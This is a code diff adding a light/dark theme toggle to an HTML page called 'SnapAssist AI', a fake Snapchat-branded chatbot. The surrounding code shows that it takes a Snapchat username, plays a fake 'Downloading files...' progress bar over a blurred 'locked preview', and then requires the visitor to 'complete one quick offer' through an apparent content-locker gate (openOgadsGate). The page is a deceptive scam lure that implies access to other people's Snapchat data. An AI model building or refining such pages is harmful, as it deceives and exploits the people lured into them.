@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -15,11 +15,22 @@
             --snap-yellow: #FFFC00;
             --snap-black: #000000;
             --bg-chat: #0b0b0c;
+            --bg-workspace: #000000;
             --bg-bubble-user: #1d1d1f;
             --border-color: #262629;
             --text-main: #ececec;
             --text-muted: #9e9e9e;
             --font-main: 'Poppins', sans-serif;
+        }
+
+        /* ستيل الطور المضيء - Light Mode */
+        [data-theme="light"] {
+            --bg-chat: #f9f9f9;
+            --bg-workspace: #ffffff;
+            --bg-bubble-user: #e2e2e5;
+            --border-color: #e5e5e5;
+            --text-main: #0d0d0d;
+            --text-muted: #676767;
         }
 
         * {
@@ -30,11 +41,12 @@
         }
 
         body {
-            background-color: var(--snap-black);
+            background-color: var(--bg-workspace);
             color: var(--text-main);
             display: flex;
             justify-content: center;
             min-height: 100vh;
+            transition: background-color 0.3s ease, color 0.3s ease;
         }
 
         /* حاوية الشات بستايل ChatGPT */
@@ -48,9 +60,10 @@
             position: relative;
             border-left: 1px solid var(--border-color);
             border-right: 1px solid var(--border-color);
+            transition: background 0.3s ease, border-color 0.3s ease;
         }
 
-        /* الهيدر العلوي بسناب شات شات جي بي تي */
+        /* الهيدر العلوي */
         .chat-header {
             padding: 14px 20px;
             display: flex;
@@ -61,6 +74,7 @@
             position: sticky;
             top: 0;
             z-index: 50;
+            transition: background 0.3s ease, border-color 0.3s ease;
         }
 
         .ai-brand {
@@ -81,6 +95,26 @@
             align-items: center;
             justify-content: center;
             font-size: 14px;
+            box-shadow: 0 2px 8px rgba(255, 252, 0, 0.3);
+        }
+
+        /* زر تغيير الألوان */
+        .theme-switcher-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            cursor: pointer;
+            font-size: 16px;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+        .theme-switcher-btn:hover {
+            background: var(--bg-bubble-user);
         }
 
         /* منطقة رسائل الشات الحية */
@@ -116,6 +150,8 @@
             padding: 10px 16px;
             border-radius: 20px;
             border: 1px solid var(--border-color);
+            color: var(--text-main);
+            transition: background 0.3s ease, border-color 0.3s ease;
         }
 
         /* أنيميشن التنقيط */
@@ -129,7 +165,7 @@
         .typing-dots span {
             width: 6px;
             height: 6px;
-            background: var(--snap-yellow);
+            background: var(--text-muted);
             border-radius: 50%;
             animation: bounceDot 1.4s infinite ease-in-out both;
         }
@@ -166,8 +202,8 @@
             transition: all 0.2s ease;
         }
         .chat-opt-btn:hover {
-            background: #121214;
-            border-color: var(--snap-yellow);
+            background: var(--bg-bubble-user);
+            border-color: var(--text-main);
         }
         .chat-opt-btn i {
             color: var(--text-muted);
@@ -182,13 +218,14 @@
             margin-top: 12px;
             overflow: hidden;
             max-width: 280px;
+            transition: background 0.3s ease, border-color 0.3s ease;
         }
 
         .media-header-label {
             padding: 8px 12px;
-            background: rgba(0,0,0,0.2);
+            background: rgba(0,0,0,0.1);
             font-size: 11px;
-            color: var(--snap-yellow);
+            color: var(--text-muted);
             font-weight: 600;
             display: flex;
             align-items: center;
@@ -219,8 +256,8 @@
             justify-content: center;
             gap: 6px;
             font-size: 12px;
-            font-weight: 500;
-            color: var(--text-main);
+            font-weight: 600;
+            color: #ffffff;
         }
 
         /* شريط الـ Progress اللي كيعمر لـ 100% */
@@ -239,7 +276,7 @@
 
         .progress-bar-bg {
             width: 100%;
-            background: #121214;
+            background: var(--bg-bubble-user);
             height: 8px;
             border-radius: 4px;
             overflow: hidden;
@@ -248,15 +285,14 @@
 
         .progress-bar-fill {
             height: 100%;
-            background: var(--snap-yellow);
+            background: var(--text-main);
             width: 0%;
-            box-shadow: 0 0 8px rgba(255, 252, 0, 0.4);
         }
 
         /* مساج عرض الـ Locker النهائي */
         .offer-verification-card {
-            border: 1px dashed var(--snap-yellow);
-            background: rgba(255, 252, 0, 0.02);
+            border: 1px dashed var(--text-muted);
+            background: var(--bg-bubble-user);
             border-radius: 16px;
             padding: 20px;
             margin-top: 12px;
@@ -265,12 +301,12 @@
             align-items: center;
             text-align: center;
             gap: 14px;
+            transition: background 0.3s ease, border-color 0.3s ease;
         }
 
         .offer-verification-card h4 {
             font-size: 15px;
             font-weight: 700;
-            color: var(--snap-yellow);
         }
 
         .offer-verification-card p {
@@ -284,7 +320,7 @@
             background: var(--snap-yellow);
             color: var(--snap-black);
             border: none;
-            padding: 12px;
+            padding: 13px;
             border-radius: 25px;
             font-size: 14px;
             font-weight: 700;
@@ -294,25 +330,29 @@
             justify-content: center;
             gap: 8px;
             box-shadow: 0 4px 15px rgba(255, 252, 0, 0.2);
+            transition: transform 0.2s;
         }
+        .gpt-action-btn:active { transform: scale(0.98); }
 
-        /* صندوق الإدخال التحتاني - تم تعديل الـ Placeholder هنا */
+        /* صندوق الإدخال التحتاني */
         .chat-input-area {
             padding: 16px;
             background: var(--bg-chat);
+            transition: background 0.3s ease;
         }
 
         .input-box-container {
-            background: var(--snap-black);
+            background: var(--bg-workspace);
             border: 1px solid var(--border-color);
             border-radius: 24px;
             display: flex;
             align-items: center;
             padding: 6px 6px 6px 16px;
+            transition: background 0.3s ease, border-color 0.3s ease;
         }
 
         .input-box-container:focus-within {
-            border-color: var(--snap-yellow);
+            border-color: var(--text-main);
         }
 
         .gpt-input {
@@ -328,8 +368,8 @@
         .send-btn {
             width: 32px;
             height: 32px;
-            background: var(--snap-yellow);
-            color: var(--snap-black);
+            background: var(--text-main);
+            color: var(--bg-chat);
             border: none;
             border-radius: 50%;
             cursor: pointer;
@@ -337,7 +377,7 @@
             align-items: center;
             justify-content: center;
             font-size: 14px;
-            transition: opacity 0.2s;
+            transition: background 0.3s, color 0.3s;
         }
         .send-btn:disabled {
             opacity: 0.3;
@@ -357,19 +397,21 @@
 <body>
 
     <div class="chat-container">
-        <!-- الهيدر العلوي -->
+        <!-- الهيدر العلوي مع زر تغيير اللون بين الكحل والابيض -->
         <div class="chat-header">
             <div class="ai-brand">
                 <div class="ai-avatar"><i class="fa-brands fa-snapchat"></i></div>
                 <span>SnapAssist AI</span>
             </div>
-            <i class="fa-solid fa-bolt" style="color: var(--snap-yellow); font-size: 14px;"></i>
+            <button class="theme-switcher-btn" id="themeSwitcher" onclick="toggleInterfaceColorTheme()">
+                <i class="fa-solid fa-sun"></i>
+            </button>
         </div>
 
         <!-- ساحة عرض المحادثة -->
         <div class="chat-history" id="chatWindow">
             
-            <!-- رسالة الترحيب واضحة ومفهومة بالإنجليزية العادية -->
+            <!-- رسالة الترحيب -->
             <div class="chat-row ai-row" id="welcomeMsg">
                 <div class="ai-avatar"><i class="fa-brands fa-snapchat"></i></div>
                 <div class="msg-bubble">
@@ -387,7 +429,7 @@
 
         </div>
 
-        <!-- شريط الكتابة التحتاني معدل باش يكتبو الكونت نيت -->
+        <!-- شريط الكتابة التحتاني -->
         <div class="chat-input-area">
             <div class="input-box-container">
                 <input type="text" class="gpt-input" id="userInputField" placeholder="Enter your Snapchat username..." autocomplete="off">
@@ -404,8 +446,8 @@
         const userInputField = document.getElementById('userInputField');
         const sendBtn = document.getElementById('sendBtn');
         const typingBubble = document.getElementById('typingBubble');
+        const themeSwitcher = document.getElementById('themeSwitcher');
 
-        // خريطة الصور المقترنة بالخيارات المفهومة
         const assetMap = {
             'radar': 'Snaping.jpg',
             'friends': 'friends.jpg',
@@ -418,6 +460,18 @@
         userInputField.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') submitUserIdentifier();
         });
+
+        // دالة قلب ألوان الصفحة من الكحل للأبيض والعكس
+        function toggleInterfaceColorTheme() {
+            const currentTheme = document.documentElement.getAttribute('data-theme');
+            if (currentTheme === 'dark') {
+                document.documentElement.setAttribute('data-theme', 'light');
+                themeSwitcher.innerHTML = '<i class="fa-solid fa-moon"></i>';
+            } else {
+                document.documentElement.setAttribute('data-theme', 'dark');
+                themeSwitcher.innerHTML = '<i class="fa-solid fa-sun"></i>';
+            }
+        }
 
         function showTyping() {
             chatWindow.appendChild(typingBubble);
@@ -448,7 +502,6 @@
             chatWindow.scrollTop = chatWindow.scrollHeight;
         }
 
-        // إدخال الإسم وظهور الخيارات بنفس العناوين المفهومة ديالك
         function submitUserIdentifier() {
             const val = userInputField.value.trim();
             if (val === '') return;
@@ -480,7 +533,6 @@
             }, 3000);
         }
 
-        // اختيار الخدمة وبدء العداد الـ 100% المفهوم
         function selectModuleNode(nodeName, assetKey) {
             const btns = document.querySelectorAll('.chat-opt-btn');
             btns.forEach(b => b.removeAttribute('onclick'));
@@ -502,8 +554,8 @@
                         
                         <div class="progress-block">
                             <div class="progress-labels">
-                                <span style="color: var(--snap-yellow);">Downloading files...</span>
-                                <span id="${txtId}" style="color: var(--snap-yellow); font-weight:700;">0%</span>
+                                <span>Downloading files...</span>
+                                <span id="${txtId}" style="font-weight:700;">0%</span>
                             </div>
                             <div class="progress-bar-bg">
                                 <div class="progress-bar-fill" id="${barId}"></div>
@@ -515,7 +567,7 @@
                             <div class="media-frame">
                                 <img src="${targetImg}" alt="Preview View">
                                 <div class="media-blur-overlay">
-                                    <i class="fa-solid fa-lock" style="color: var(--snap-yellow); font-size:16px;"></i>
+                                    <i class="fa-solid fa-lock" style="font-size:16px; margin-bottom: 4px;"></i>
                                     <span>LOCKED_PREVIEW.JPG</span>
                                 </div>
                             </div>
@@ -528,7 +580,6 @@
             }, 3000);
         }
 
-        // تشغيل عداد الـ 100%
         function animateProgressBarNode(barId, txtId) {
             let percentage = 0;
             const fill = document.getElementById(barId);
@@ -545,10 +596,9 @@
                         showTyping();
                         setTimeout(() => {
                             hideTyping();
-                            // مساج الـ Complete 1 Offer واشح ومباشر ومفهوم
                             const finalOfferHtml = `
                                 <div class="offer-verification-card">
-                                    <i class="fa-solid fa-circle-exclamation" style="color: var(--snap-yellow); font-size: 24px;"></i>
+                                    <i class="fa-solid fa-circle-exclamation" style="font-size: 24px;"></i>
                                     <h4>Complete One Offer Below</h4>
                                     <p>The loading process is 100% complete. To unlock and view the dashboard, please click the button below and complete <strong>one quick offer</strong> from the list.</p>
                                     <button class="gpt-action-btn" onclick="openOgadsGate()">
